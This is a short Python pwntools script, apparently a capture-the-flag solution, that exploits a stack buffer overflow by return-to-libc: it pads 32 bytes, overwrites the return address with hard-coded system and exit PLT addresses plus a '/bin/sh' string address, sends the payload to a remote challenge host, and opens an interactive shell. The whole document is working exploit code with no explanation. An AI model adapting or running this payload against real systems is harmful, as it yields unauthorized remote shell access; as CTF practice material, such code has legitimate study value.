# Buffer-overflow and return2libc using the existing PLT stubs

from pwn import *

context.log_level = 'debug'

systemPLT = 0x08048430
exitPLT = 0x08048440
binsh = 0x0804a038

r = remote('pwn.ctf.tamu.edu',4324)
#r = remote('192.168.122.76',4323)

exp = "A" * 32
exp += p32(systemPLT)
exp += p32(exitPLT)
exp += p32(binsh)

r.sendline(exp)
r.interactive()
